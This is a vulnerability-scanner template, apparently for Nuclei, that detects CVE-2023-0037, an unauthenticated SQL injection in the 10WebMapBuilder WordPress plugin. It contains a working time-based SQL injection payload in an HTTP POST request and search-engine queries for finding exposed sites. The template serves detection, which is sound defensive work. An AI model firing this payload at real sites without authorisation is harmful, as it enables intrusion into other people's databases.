id: CVE-2023-0037

info:
  name: 10WebMapBuilder < 1.0.73 - Unauthenticated SQL Injection
  author: ritikchaddha
  severity: high
  description: |
    The 10WebMapBuilder WordPress plugin before 1.0.73 does not properly sanitize and escape some parameters before using them in an SQL statement via an AJAX action available to unauthenticated users, leading to SQL injection.
  remediation: |
    Update the 10WebMapBuilder plugin to version 1.0.73 or later.
  reference:
    - https://wpscan.com/vulnerability/33ab1fe2-6611-4f43-91ba-52c56f02ed56/
    - https://bulletin.iese.de/post/wd-google-maps_1-0-72_1
  classification:
    cve-id: CVE-2023-0037
    cwe-id: CWE-89
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.6
  metadata:
    plugin: wd-google-maps
    max-request: 1
    verified: true
    shodan-query: http.html:"wp-content/plugins/wd-google-maps"
    fofa-query: body="wp-content/plugins/wd-google-maps"
  tags: cve,cve2023,wordpress,wp-plugin,10webmapbuilder,sqli,unauth

http:
  - raw:
      - |
        POST /2022/12/29/map/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        radius=1+and+(SELECT+7741+FROM+(SELECT(SLEEP(6)))hlAf)&lat=0.0&lng=0.0&distance_in=km

    matchers:
      - type: dsl
        dsl:
          - "duration>=6"